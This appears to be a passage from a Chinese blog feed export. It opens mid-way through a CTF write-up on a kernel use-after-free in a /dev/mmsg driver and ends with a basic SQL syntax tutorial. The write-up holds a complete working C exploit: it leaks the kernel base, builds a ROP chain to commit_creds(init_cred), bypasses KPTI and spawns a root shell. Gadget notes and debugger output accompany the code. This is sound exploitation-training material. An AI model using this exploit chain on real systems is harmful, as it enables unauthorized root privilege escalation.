<li>swapgs; iretq 返回用户态; ret rip,在此处没有使用ret指令，直接iretq, 直接r9为user_rsp就行</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">swapgs            </span><br><span class="line">iretq             </span><br><span class="line">rsp ---&gt; rip </span><br><span class="line">         cs</span><br><span class="line">         rflags</span><br><span class="line">         rsp</span><br><span class="line">         ss</span><br></pre></td></tr></table></figure>

<ul>
<li>swapgs_restore_regs_and_return_to_usermode: 这个比上个复杂一点，需要在迁移一次</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">swapgs_restore_regs_and_return_to_usermode + 22  </span><br><span class="line">0 // padding  </span><br><span class="line">0 // padding  </span><br><span class="line">get_shell</span><br><span class="line">user_cs  </span><br><span class="line">user_rflags  </span><br><span class="line">user_sp</span><br><span class="line">user_ss</span><br></pre></td></tr></table></figure>

<h4 id="errors"><a href="#errors" class="headerlink" title="errors"></a>errors</h4><ol>
<li>qemu cpu为 <code>host</code> 也必须开启kvm, 同时就是这一点，导致我一直不成功，后来去除掉kvm将cpu改为kvm64成功。应该是本机的CPU的安全防护导致一直失败😥。</li>
</ol>
<h4 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h4><ul>
<li>signal bypass kpti。执行用户态的任意代码都会报出信号<code>SIGSEGV</code>，那么在程序开始时将<code>SIGSEGV</code>与shell函数绑定在一起，那么访问用户态代码时就会报出信号<code>SIGSEGV</code>，就会执行信号函数。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_GREEN <span class="string">&quot;\033[32m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_RED <span class="string">&quot;\033[31m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_YELLOW <span class="string">&quot;\033[33m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_DEFAULT <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_debug(fmt, ...)                                                    \</span></span><br><span class="line"><span class="meta">  dprintf(2, <span class="string">&quot;[*] %s:%d &quot;</span> fmt <span class="string">&quot;\n&quot;</span>, __FILE__, __LINE__, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_info(fmt, ...)                                                     \</span></span><br><span class="line"><span class="meta">  dprintf(2, COLOR_GREEN <span class="string">&quot;[+] %s:%d &quot;</span> fmt <span class="string">&quot;\n&quot;</span> COLOR_DEFAULT, __FILE__,        \</span></span><br><span class="line"><span class="meta">          __LINE__, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_warning(fmt, ...)                                                  \</span></span><br><span class="line"><span class="meta">  dprintf(2, COLOR_YELLOW <span class="string">&quot;[!] %s:%d &quot;</span> fmt <span class="string">&quot;\n&quot;</span> COLOR_DEFAULT, __FILE__,       \</span></span><br><span class="line"><span class="meta">          __LINE__, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_error(fmt, ...)                                                    \</span></span><br><span class="line"><span class="meta">  dprintf(2, COLOR_RED <span class="string">&quot;[-] %s:%d &quot;</span> fmt <span class="string">&quot;\n&quot;</span> COLOR_DEFAULT, __FILE__,          \</span></span><br><span class="line"><span class="meta">          __LINE__, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> die(fmt, ...)                  \</span></span><br><span class="line"><span class="meta">  do &#123;                                 \</span></span><br><span class="line"><span class="meta">    log_error(fmt, ##__VA_ARGS__);          \</span></span><br><span class="line"><span class="meta">    log_error(<span class="string">&quot;Exit at line %d&quot;</span>, __LINE__); \</span></span><br><span class="line"><span class="meta">    exit(1);                           \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">if</span>( getuid() ) &#123;</span><br><span class="line">  die(<span class="string">&quot;fail to get shell&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">    log_info(<span class="string">&quot;start to get root shell&quot;</span>);</span><br><span class="line"> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_rsp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_rsp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    log_info(<span class="string">&quot;status saved&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">seq_open</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> seq;</span><br><span class="line"> <span class="keyword">if</span> ( (seq=open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) == <span class="number">-1</span>) &#123;</span><br><span class="line">  die(<span class="string">&quot;seq open fail&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> seq;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMSG_ALLOC 0x1111111</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMSG_COPY 0x2222222</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMSG_RECV 0x3333333</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMSG_UPDATE 0x4444444</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMSG_PUT_DESC 0x5555555</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMSG_GET_DESC 0x6666666</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mmsg_arg</span> &#123;</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> token;</span><br><span class="line">        <span class="type">int</span> top;</span><br><span class="line">        <span class="type">int</span> size;</span><br><span class="line">        <span class="type">char</span> *data;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> kernel_base = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> kernel_offset = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> nokaslr = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0xffffffff9248d790</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff8108d350</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff93000e30</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff811aa376</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xffffffff8264c9a0</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_iretq = <span class="number">0xffffffff81c00ec6</span>;</span><br><span class="line"><span class="type">size_t</span> add_rsp_0x168_ret = <span class="number">0xffffffff81909b8c</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> mmsg_fd;</span><br><span class="line"><span class="type">int</span> seq_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">exploit</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    log_info(<span class="string">&quot;open device&quot;</span>);</span><br><span class="line">    mmsg_fd = open(<span class="string">&quot;/dev/mmsg&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (mmsg_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        die(<span class="string">&quot;open device&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mmsg_arg</span> <span class="title">arg</span>;</span></span><br><span class="line">    arg.token = <span class="number">1</span>;</span><br><span class="line">    arg.top = <span class="number">1</span>;</span><br><span class="line">    arg.size = <span class="number">16</span>;</span><br><span class="line">    arg.data = <span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    <span class="type">size_t</span> *buf = (<span class="type">size_t</span> *)arg.data;</span><br><span class="line">    buf[<span class="number">0</span>] = <span class="number">0x1145141145141145</span>ull;</span><br><span class="line">    buf[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    ioctl(mmsg_fd, MMSG_PUT_DESC, &amp;arg);  <span class="comment">// bypass size check</span></span><br><span class="line">    ioctl(mmsg_fd, MMSG_RECV, &amp;arg);     <span class="comment">// free head</span></span><br><span class="line"></span><br><span class="line">    seq_fd = seq_open();</span><br><span class="line"></span><br><span class="line">    ioctl(mmsg_fd, MMSG_GET_DESC, &amp;arg);</span><br><span class="line">    log_warning(<span class="string">&quot;start leak info&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i ++) &#123;</span><br><span class="line">        log_debug(<span class="string">&quot;buf[%d] =&gt; 0x%lx\n&quot;</span>, i, buf[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kernel_base = buf[<span class="number">0</span>] - <span class="number">0x20fac0</span>;</span><br><span class="line">    kernel_offset = kernel_base - nokaslr;</span><br><span class="line">    add_rsp_0x168_ret += kernel_offset;</span><br><span class="line">    pop_rdi_ret += kernel_offset;</span><br><span class="line">    init_cred += kernel_offset;</span><br><span class="line">    commit_creds += kernel_offset;</span><br><span class="line">    swapgs_iretq += kernel_offset;</span><br><span class="line"></span><br><span class="line">    log_info(<span class="string">&quot;kernel_offset =&gt; 0x%lx&quot;</span>, kernel_offset);</span><br><span class="line">    log_info(<span class="string">&quot;kernel_base =&gt; 0x%lx&quot;</span>, kernel_base);</span><br><span class="line"></span><br><span class="line">    buf[<span class="number">0</span>] = add_rsp_0x168_ret;</span><br><span class="line">    log_info(<span class="string">&quot;pollute =&gt; 0x%lx, maybe we can debug here&quot;</span>, buf[<span class="number">0</span>]);</span><br><span class="line">    ioctl(mmsg_fd, MMSG_PUT_DESC, &amp;arg);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15,   0xbeefdead;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14,   pop_rdi_ret;&quot;</span>   <span class="comment">// &lt;- rip here</span></span><br><span class="line">        <span class="string">&quot;mov r13,   init_cred;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12,   commit_creds;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp,   swapgs_iretq;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx,   0x55555555;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11,   0x66666666;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10,   0x77777777;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9,    user_rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8,    0x99999999;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax,   rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx,   8;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi,   rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi,   seq_fd;&quot;</span>        <span class="comment">// 这里假定通过 seq_operations-&gt;stat 来触发</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    signal(SIGSEGV, get_shell);</span><br><span class="line">    save_status();</span><br><span class="line">    exploit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>cr3 bypass kpti，在高版本使用，在 <code>+22</code> 地址是我们利用的gadget。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">.text:FFFFFFFF81600A34 <span class="number">41</span> <span class="number">5F</span>                          pop     r15</span><br><span class="line">.text:FFFFFFFF81600A36 <span class="number">41</span> <span class="number">5</span>E                          pop     r14</span><br><span class="line">.text:FFFFFFFF81600A38 <span class="number">41</span> <span class="number">5</span>D                          pop     r13</span><br><span class="line">.text:FFFFFFFF81600A3A <span class="number">41</span> <span class="number">5</span>C                          pop     r12</span><br><span class="line">.text:FFFFFFFF81600A3C <span class="number">5</span>D                             pop     rbp</span><br><span class="line">.text:FFFFFFFF81600A3D <span class="number">5B</span>                             pop     rbx</span><br><span class="line">.text:FFFFFFFF81600A3E <span class="number">41</span> <span class="number">5B</span>                          pop     r11</span><br><span class="line">.text:FFFFFFFF81600A40 <span class="number">41</span> <span class="number">5</span>A                          pop     r10</span><br><span class="line">.text:FFFFFFFF81600A42 <span class="number">41</span> <span class="number">59</span>                          pop     r9</span><br><span class="line">.text:FFFFFFFF81600A44 <span class="number">41</span> <span class="number">58</span>                          pop     r8</span><br><span class="line">.text:FFFFFFFF81600A46 <span class="number">58</span>                             pop     rax</span><br><span class="line">.text:FFFFFFFF81600A47 <span class="number">59</span>                             pop     rcx</span><br><span class="line">.text:FFFFFFFF81600A48 <span class="number">5</span>A                             pop     rdx</span><br><span class="line">.text:FFFFFFFF81600A49 <span class="number">5</span>E                             pop     rsi</span><br><span class="line">.text:FFFFFFFF81600A4A <span class="number">48</span> <span class="number">89</span> E7                       mov     rdi, rsp    &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span><br><span class="line">.text:FFFFFFFF81600A4D <span class="number">65</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">24</span> <span class="number">25</span>+                mov     rsp, gs: <span class="number">0x5004</span></span><br><span class="line">.text:FFFFFFFF81600A56 FF <span class="number">77</span> <span class="number">30</span>                       push    qword ptr [rdi+<span class="number">30</span>h]</span><br><span class="line">.text:FFFFFFFF81600A59 FF <span class="number">77</span> <span class="number">28</span>                       push    qword ptr [rdi+<span class="number">28</span>h]</span><br><span class="line">.text:FFFFFFFF81600A5C FF <span class="number">77</span> <span class="number">20</span>                       push    qword ptr [rdi+<span class="number">20</span>h]</span><br><span class="line">.text:FFFFFFFF81600A5F FF <span class="number">77</span> <span class="number">18</span>                       push    qword ptr [rdi+<span class="number">18</span>h]</span><br><span class="line">.text:FFFFFFFF81600A62 FF <span class="number">77</span> <span class="number">10</span>                       push    qword ptr [rdi+<span class="number">10</span>h]</span><br><span class="line">.text:FFFFFFFF81600A65 FF <span class="number">37</span>                          push    qword ptr [rdi]</span><br><span class="line">.text:FFFFFFFF81600A67 <span class="number">50</span>                             push    rax</span><br><span class="line">.text:FFFFFFFF81600A68 EB <span class="number">43</span>                          nop</span><br><span class="line">.text:FFFFFFFF81600A6A <span class="number">0F</span> <span class="number">20</span> DF                       mov     rdi, cr3</span><br><span class="line">.text:FFFFFFFF81600A6D EB <span class="number">34</span>                          jmp     <span class="number">0xFFFFFFFF81600AA3</span></span><br><span class="line"></span><br><span class="line">.text:FFFFFFFF81600AA3 <span class="number">48</span> <span class="number">81</span> CF <span class="number">00</span> <span class="number">10</span>+                or      rdi, <span class="number">1000</span>h</span><br><span class="line">.text:FFFFFFFF81600AAA <span class="number">0F</span> <span class="number">22</span> DF                       mov     cr3, rdi</span><br><span class="line">.text:FFFFFFFF81600AAD <span class="number">58</span>                             pop     rax</span><br><span class="line">.text:FFFFFFFF81600AAE <span class="number">5F</span>                             pop     rdi</span><br><span class="line">.text:FFFFFFFF81600AAF FF <span class="number">15</span> <span class="number">23</span> <span class="number">65</span> <span class="number">62</span>+                call    cs: SWAPGS</span><br><span class="line">.text:FFFFFFFF81600AB5 FF <span class="number">25</span> <span class="number">15</span> <span class="number">65</span> <span class="number">62</span>+                jmp     cs: INTERRUPT_RETURN</span><br><span class="line"></span><br><span class="line">_SWAPGS</span><br><span class="line">.text:FFFFFFFF8103EFC0 <span class="number">55</span>                             push    rbp</span><br><span class="line">.text:FFFFFFFF8103EFC1 <span class="number">48</span> <span class="number">89</span> E5                       mov     rbp, rsp</span><br><span class="line">.text:FFFFFFFF8103EFC4 <span class="number">0F</span> <span class="number">01</span> F8                       swapgs</span><br><span class="line">.text:FFFFFFFF8103EFC7 <span class="number">5</span>D                             pop     rbp</span><br><span class="line">.text:FFFFFFFF8103EFC8 C3                             retn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_INTERRUPT_RETURN</span><br><span class="line">.text:FFFFFFFF81600AE0 F6 <span class="number">44</span> <span class="number">24</span> <span class="number">20</span> <span class="number">04</span>                 test    byte ptr [rsp+<span class="number">0x20</span>], <span class="number">4</span></span><br><span class="line">.text:FFFFFFFF81600AE5 <span class="number">75</span> <span class="number">02</span>                          jnz     native_irq_return_ldt</span><br><span class="line">.text:FFFFFFFF81600AE7 <span class="number">48</span> CF                          iretq</span><br></pre></td></tr></table></figure>

<ul>
<li>看别人的做法，好像不需要关注rip后面的内容，但是本题我没有使用这种方式做出来 👀。</li>
<li>最后需要我们调用getshell函数。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">   __asm__(</span><br><span class="line">       <span class="string">&quot;mov r15,   0xbeefdead;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r14,   pop_rdi_ret;&quot;</span>   <span class="comment">// &lt;- rip here</span></span><br><span class="line">       <span class="string">&quot;mov r13,   init_cred;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r12,   commit_creds;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rbp,   swapgs_restore_regs_and_return_to_usermode + 22;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rbx,   0x55555555;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r11,   0x66666666;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r10,   0x77777777;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r9,    user_rsp;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r8,    0x99999999;&quot;</span></span><br><span class="line">       <span class="string">&quot;xor rax,   rax;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rdx,   8;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rsi,   rsp;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rdi,   seq_fd;&quot;</span>    </span><br><span class="line">   );</span><br><span class="line"></span><br><span class="line">get_shell();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ul>
<li><p>commit_creds(prepare_kernel_cred (0)) &#x3D;&gt; 简化为 commit_creds(&amp;init_cred) init_cred: init 进程的权限，为root，在 <code>/proc/kallsyms</code> 内</p>
</li>
<li><p>寻找 gadget 时可能寻找到的gadget不能使用，报错为 <code>kernel tried to execute NX-protected page</code>，说明其地址不可访问？那就只能换了</p>
</li>
<li><p>为什么找不对gadget?或者根本没有找到🤡。和参考的看看了一下，发现gadget地址根本就没找对。</p>
<ul>
<li>ropper + ROPgadget + ropr 三个工具一起使用，获得三个gadget文件。</li>
<li>extract-vmlinux + vmlinux-to-elf 工具</li>
</ul>
</li>
<li><p>如何下断点？</p>
<ul>
<li>在想暂停的的地方使用 <code>getchar()</code> 停止后一路si</li>
<li>在固定的指令地址下断点，但是需要事先知道地址。但是rop时，地址一般都是知道的。</li>
</ul>
</li>
<li><p>在固定的指令下断点，比如此题就可以在在 add rsp 那一条指令下断点</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">   0xffffffff81909b8c    add    rsp, module_ioctl+56          &lt;0x168&gt;</span><br><span class="line">   0xffffffff81909b93    ret</span><br><span class="line"></span><br><span class="line">pwndbg&gt; tele 0xffffc900001c7df8+0x168 </span><br><span class="line">00:0000 0xffffc900001c7f60 0x44444444 /* <span class="string">&#x27;DDDD&#x27;</span> */</span><br><span class="line">01:0008 0xffffc900001c7f68 0x33333333 /* <span class="string">&#x27;3333&#x27;</span> */</span><br><span class="line">02:0010 0xffffc900001c7f70 0x22222222 /* <span class="string">&#x27;&quot;&quot;&quot;&quot;&#x27;</span> */</span><br><span class="line">03:0018 0xffffc900001c7f78 0xbbbb1111</span><br><span class="line">04:0020 0xffffc900001c7f80 0xbbbb2222</span><br><span class="line">05:0028 0xffffc900001c7f88 0x246</span><br><span class="line">06:0030 0xffffc900001c7f90 0x11110000</span><br><span class="line">07:0038 0xffffc900001c7f98 0x99999999</span><br><span class="line">08:0040 0xffffc900001c7fa0 0x88888888</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>kernel</tag>
        <tag>uaf</tag>
      </tags>
  </entry>
  <entry>
    <title>常用数据库基本语法</title>
    <url>/2023/06/30/%E5%B8%B8%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<blockquote>
<p>简单学习增删改查</p>
</blockquote>
<span id="more"></span>

<ul>
<li><p>三个最广泛使用的开源 RDBMS：SQLite、MySQL 和 PostgreSQL。关系型数据库</p>
</li>
<li><p>因为SQL的标准，三个数据库差不多的语法。</p>
</li>
</ul>
<h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><blockquote>
<p>其实是开源 MariaDB</p>
</blockquote>
<ul>
<li>数据库</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建</span></span><br><span class="line"><span class="keyword">CREATE</span> DATABASE db_name; </span><br><span class="line"></span><br><span class="line"><span class="comment">-- 删除</span></span><br><span class="line"><span class="keyword">DROP</span> DATABASE db_name;   </span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查看</span></span><br><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 连接</span></span><br><span class="line">use database_name;</span><br></pre></td></tr></table></figure>

<ul>
<li>表</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> table_name (</span><br><span class="line">	column_name data_type 属性 </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">SHOW</span> tables;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 删除</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> table_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查询</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">from</span> table_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 增加</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">into</span> table_name(column_name) <span class="keyword">values</span>(&quot;xxx&quot;);</span><br></pre></td></tr></table></figure>

<ul>
<li><p>数据类型</p>
</li>
<li><p>查询限定</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 排序</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 属性限定</span></span><br><span class="line"><span class="keyword">WHERE</span>, <span class="keyword">AND</span>, <span class="keyword">OR</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 结果个数</span></span><br><span class="line">limit</span><br></pre></td></tr></table></figure>

<h2 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h2><ul>
<li>数据库</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建</span></span><br><span class="line"><span class="keyword">CREATE</span> DATABASE db_name; </span><br><span class="line"></span><br><span class="line"><span class="comment">-- 删除</span></span><br><span class="line"><span class="keyword">DROP</span> DATABASE db_name;   </span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查看</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 连接</span></span><br></pre></td></tr></table></figure>

<ul>
<li>表</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> table_name (</span><br><span class="line">	column_name data_type 属性 </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 删除</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> table_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查询</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">from</span> table_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 增加</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">into</span> table_name(column_name) <span class="keyword">values</span>(&quot;xxx&quot;);</span><br></pre></td></tr></table></figure>

<ul>
<li>查询</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 排序</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 去重</span></span><br><span class="line"><span class="keyword">distinct</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 属性限定</span></span><br><span class="line"><span class="keyword">WHERE</span>, <span class="keyword">AND</span>, <span class="keyword">OR</span></span><br></pre></td></tr></table></figure>

<h2 id="SQLite"><a href="#SQLite" class="headerlink" title="SQLite"></a>SQLite</h2><ul>
<li><p>sqlite3</p>
</li>
<li><p>命令</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.help;     -- 帮助信息</span><br><span class="line"></span><br><span class="line">.open test.db;  -- 打开文件，如果没有就创建</span><br><span class="line"></span><br><span class="line">.show;     -- 显示一系列属性</span><br><span class="line"></span><br><span class="line">.quit   -- 退出</span><br><span class="line"></span><br><span class="line">.databases  -- 显示数据库</span><br></pre></td></tr></table></figure>

<ul>
<li>创建数据库</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 读取或者创建</span><br><span class="line">sqlite3 name</span><br><span class="line">.open name</span><br></pre></td></tr></table></figure>

<ul>
<li>导入导出数据库</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.dump   -- 将数据库导出SQL 文件 </span><br><span class="line">sqlite3 test.db .dump &gt; test.sql</span><br><span class="line">sqlite3 test.db &lt; test.db</span><br></pre></td></tr></table></figure>

<ul>
<li>创建表</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.tables  -- 显示表</span><br><span class="line">.schema  -- 表的信息</span><br><span class="line"></span><br><span class="line">CREATE TABLE table_name (</span><br><span class="line">	column_name type primary key</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">DROP TABLE database.table_name;</span><br><span class="line"></span><br><span class="line">INSERT INTO table_name(&quot;cloumn_name&quot;) values (&quot;value&quot;)</span><br></pre></td></tr></table></figure>

<ul>
<li>查询</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 还是SELECT 语句</span><br></pre></td></tr></table></figure>

<h1 id="编程操作"><a href="#编程操作" class="headerlink" title="编程操作"></a>编程操作</h1><ul>
<li>使用C语言操作数据库，其余编程语言操作数据库也差不多，主要是写SQL语句的操作。</li>
</ul>
]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>Database</tag>
      </tags>
  </entry>
  <entry>
